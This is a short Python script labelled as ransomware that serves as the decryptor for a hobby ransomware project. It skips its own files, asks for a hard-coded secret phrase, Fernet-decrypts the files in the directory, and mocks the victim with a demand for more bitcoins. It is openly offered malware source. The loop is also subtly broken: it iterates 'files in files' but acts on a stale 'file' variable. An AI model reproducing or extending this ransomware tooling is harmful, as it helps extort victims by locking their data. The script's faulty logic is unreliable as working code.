#python3 ransomware 
#by leogzz0
#this program will go through your files and decrypt them

import os
from cryptography.fernet import Fernet

#let's find some files!!!

files = []

#loop to check all files in a directory
for file in os.listdir():
    #victim would not see this two files listed in their directory
    if file == "ransomware.py" or file == "thekey.key" or file == "decrypt.py":
        continue
    #only files (not directories) would be appended to the files list
    if os.path.isfile(file):
        files.append(file) 

#print the files encrypted
print(files)

#read thekey.key in binary mode 
with open("thekey.key", "rb") as key:
    #save the content of the binary key in variable
    secret_key = key.read()

secretphrase = "beer"

user_phrase = input("Enter the secret phrase to decrypt your files\n")

#if the secretphrase is correct decryption would be next
if user_phrase == secretphrase:
    for files in files:
        #open all of the files and read them in rb (read binary)
        with open(file, "rb") as thefile:
            #save all the binary files to the contents variable
            contents = thefile.read()
        #decryption of the content with the key
        contents_decrypted = Fernet(secret_key).decrypt(contents)
        #open files and this time us wb (write binary)
        with open(file, "wb") as thefile:
            #write decrypted content back to the file
            thefile.write(contents_decrypted)
        #little congrats to our victim
        print("Congratulations, you're files are decrypted. Enjoy your beer. Until next one.")
#if wrong secretphrase let them know hehe
else:
    print("Sorry, wrong secret phrase. Send me more bitcoins!!!")